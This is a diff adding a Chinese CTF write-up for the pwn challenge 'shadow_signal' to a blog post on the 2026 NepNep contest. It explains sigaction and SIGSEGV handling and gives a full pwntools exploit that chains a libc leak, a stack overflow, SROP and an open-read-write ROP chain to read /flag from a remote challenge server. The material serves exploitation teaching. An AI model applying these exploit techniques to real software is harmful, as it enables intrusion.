@@ -1,19 +1,214 @@
----
-title: Nepnep2026
-published: 2026-08-08
-description: 招新赛的onlyone题目wp
-tags: [CTF,PWN,Libc,chunk]
-category: CTF
-draft: false
----
-
-
-
 # 2026NepNep招新赛
+
+## **shadow_signal**
+
+### 前置学习
+
+```
+#sigaction是Linux 头文件 <signal.h> 里面早就定义好的结构体类型模板,本题act为一个实例
+struct sigaction的一个经典结构
+{
+    union  #嵌合体,占用同一块空间,只能用一个
+    {
+        void (*sa_handler)(int);  #自定义的错误处理函数,遇到SIGSEGV就会调用,存储函数指针
+        void (*sa_sigaction)(int, siginfo_t *, void *);  #和handler区别在于可以接受参数,可以指定某种SIGSEGV触发
+    };
+
+    sigset_t sa_mask;  #一个信号集合,表示当 handler 正在执行时，还要临时屏蔽哪些 signal。
+
+    int sa_flags;  #一个标志位,标志一些行为
+
+    void (*sa_restorer)(void);
+};
+```
+
+sa_mask可以通过函数修改,如函数名一样,可以清空,或添加特定的signal
+
+```
+sigemptyset(&act.sa_mask); 
+sigaddset(&act.sa_mask, SIGINT); 
+sigaddset(&act.sa_mask, SIGALRM);
+```
+
+sa_flags有几个常见取值: (可以混合相加同时使用)(每一个都是宏)			
+
+```
+SA_SIGINFO    4  表示选用可传参的handler
+
+SA_ONSTACK    0x08000000  让 signal handler 在一个专门的备用信号栈上运行
+
+SA_RESTART    0x10000000   当信号打断某些系统调用时，结束处理后自动重新开始系统调用
+
+SA_NODEFER    0x40000000  允许 handler 执行期间，同一个信号再次触发 handler。
+
+SA_RESETHAND  0x80000000   handler只生效一次
+```
+
+多数情况下,ida只能逆向sa_flag写成数字的形式,我们可以通过grep -Rn指令指定查询内容和地址
+
+通常路径就是 /usr/include/\*/bits/\*
+
+![image-20260809105139837](NepNep.assets/image-20260809105139837.png)
+
+```
+sigaction函数
+sigaction(11, &act, 0); 
+把act的信号处理配置应用于第11信号,即SIGSEGV 第三个参数表示旧配置要保存在哪,也传入一个指针,写0则是不保存 配置成功返回0失败返回-1
+```
+
+还需要注意,程序中的这些stdin,stdout都只是一个指针,其指向的内容才是libc的真正I/O对象,如果&stdin,得到的是指针所在位置,并非指针的指向内容
+
+stdin	 对应	IO_2_1_stdin
+stdout      对应	IO_2_1_stdout
+stderr       对应        IO_2_1_stder
+
+### 题目基本信息
+
+保护只有NX,应该就是栈题了
+
+![image-20260809150352435](NepNep.assets/image-20260809150352435.png)
+
+给了ld和对应的ld解析文件
+
+**知识点:** **SROP signal  SIGSEGV** 
+
+### 流程分析
+
+主函数很简单,给了一个I/O地址,相当于送libc 然后给了一个格式化字符串的点,但是用的是puts而不是printf
+
+![image-20260809150825029](NepNep.assets/image-20260809150825029.png)
+
+核心在于init()初始化函数:
+
+其中重定义了通用错误处理函数handler,sa_flags规定了只能触发一次程序错误,protect_bss给了一块很大的可读可写空间,最后上了沙箱,只允许ORW,和mprotect
+
+![image-20260809151527704](NepNep.assets/image-20260809151527704.png)
+
+![image-20260809150826388](NepNep.assets/image-20260809150826388.png)
+
+核心漏洞函数:handler
+
+一个明显的栈溢出,但是会检查ret是否被修改,就是不允许ROP了
+
+![image-20260809151716037](NepNep.assets/image-20260809151716037.png)
+
+这里需要知道任何错误处理结束后,内核需要恢复用户态信息,一定会去调用rt_sigreturn函数恢复,且会先经过一个跳板,也就是libc里的 mov rax, 15;  syscall
+
+### 逻辑分析
+
+本题实际上思路很简单 肯定是要触发handler利用栈溢出伪造frame,也就是SROP,然后程序也特意给了.bss一段区域,那么就是直接向bss写进orw链,通过SROP设置rsp为ROP开头就好了 最后orw就会读取flag,不多说直接看exp吧
+
+### 完整exp
+
+```
+from pwn import *
+context.binary = elf = ELF('./shadow_signal', checksec=False)
+
+libc = ELF('./libc.so.6', checksec=False)
+context.log_level = 'info'
+
+\#io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './shadow_signal'])
+io = remote('nc1.ctfplus.cn',24107)
+
+io.recvuntil(b'gift: ')
+stdout = int(io.recvline().strip(), 16)
+libc.address = stdout - libc.sym['_IO_2_1_stdout_']
+log.success(f'libc base: {libc.address:#x}')
+
+io.send(p64(1))
+io.recvuntil(b'signal\n')
+
+bss = 0x405800
+restore_rt = libc.address + 0x42520   # mov rax, 0xf; syscall 通过gdb调试得到固定偏移
+
+frame = SigreturnFrame()
+frame.rax = constants.SYS_read
+frame.rdi = 0
+frame.rsi = bss
+frame.rdx = 0x500
+frame.rsp = bss
+frame.rip = libc.sym['read']
+
+payload = flat(
+  b'A' * 0x118,
+  restore_rt,
+  bytes(frame), #记得进行bytes转换，frame本身相当于一个对象
+)
+io.send(payload)
+
+pop_rax = libc.address + 0x45eb0     # pop rax; ret
+pop_rdi = libc.address + 0x2a3e5     # pop rdi; ret
+pop_rsi = libc.address + 0x2be51     # pop rsi; ret
+pop_rdx_rbx = libc.address + 0x904a9   # pop rdx; pop rbx; ret
+syscall_ret = libc.address + 0x91316   # syscall; ret
+
+flag_path = bss + 0x300
+flag_buf = bss + 0x380
+
+chain = flat(
+  pop_rax, constants.SYS_open,
+  pop_rdi, flag_path,
+  pop_rsi, 0,
+  pop_rdx_rbx, 0, 0,
+  syscall_ret,
+
+  pop_rdi, 3,
+  pop_rsi, flag_buf,
+  pop_rdx_rbx, 0x100, 0,
+  libc.sym['read'],
+
+  pop_rdi, 1,
+  pop_rsi, flag_buf,
+  pop_rdx_rbx, 0x100, 0,
+  libc.sym['write'],
+)
+
+stage2 = chain.ljust(0x300, b'\0') + b'/flag\0'
+sleep(0.2)
+io.send(stage2)
+sleep(0.1)
+
+result = io.recvall(timeout=3)
+print(result)
+```
+
+### exp解释
+
+有几个点需要说明:
+
+找gadget时,syscall ret在程序中有非常多,可以直接查汇编,然后多试几个
+
+```
+ROPgadget --binary libc.so.6 --opcode 0f05c3
+```
+
+
+
+泄露ret需要使用gdb调试,上述说过会用libc一个地址当跳板,我们通过gdb调试,在handler函数下断点,在查一下shadow_saved_rip的值即可得到ret地址,当然记得只留下偏移
+
+gdb调试时,可能会一直卡在这个地方,一直c也不会继续运行
+
+![](NepNep.assets/image-20260809165917456.png)
+
+这里实际上就是停在内核态里面,它需要你手动确认接下来怎么执行,可以输入
+
+```
+handle SIGSEGV nostop noprint pass
+```
+
+在按c就能正常调试了
+
+
+
+注意第一段ROP采用syscall的方法,并没有直接使用libc.open,本人尝试过但是程序会奔溃,可能内置函数改变了某些参数吧,导致寄存器被破坏了
+
+
+
+最后就是flag的地址需要多尝试几次,这里直接用/flag就读到了,可以多尝试几个别的
 
 ## onlyone
 
-### 前置学习:
+### 前置学习
 
 ```
 &stderr[-2].________pad4, &stderr[1] __
@@ -133,7 +328,7 @@ setresuid(1000,1000,1000);
 
 附件给了libc版本文件和ld文件
 
-知识点: 堆菜单 链表数据结构 栈返回 UAF
+**知识点: 堆菜单 链表数据结构 栈返回 UAF**
 
 ### 流程分析
 
@@ -341,3 +536,4 @@ print(result.decode(errors="replace"))
 最后用第二次poke的机会把这个返回地址写入链表,然后add申请后即可向返回地址处写出rop,rop被读取后write返回时就会返回到我们的rop然后执行,从而把我们的Nepnep写到fd[1]
 
 自此,拿到flag
+
